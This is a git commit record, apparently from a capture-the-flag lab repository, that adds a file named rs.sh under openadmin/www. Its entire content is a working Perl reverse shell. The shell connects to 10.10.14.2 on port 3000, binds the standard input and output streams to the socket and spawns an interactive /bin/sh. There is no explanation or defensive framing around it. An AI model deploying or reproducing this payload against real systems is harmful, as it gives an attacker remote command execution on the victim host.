568dae36cb88ff0debf72137510f12170f088a7f
jkobierczynski <jurgen.kobierczynski@telenet.be>
2021-01-03 18:39:20 +0100

    Add files via upload

---
+++ openadmin/www/rs.sh
@@ -0,0 +1,2 @@
+#!/bin/sh
+perl -e 'use Socket;$i="10.10.14.2";$p=3000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
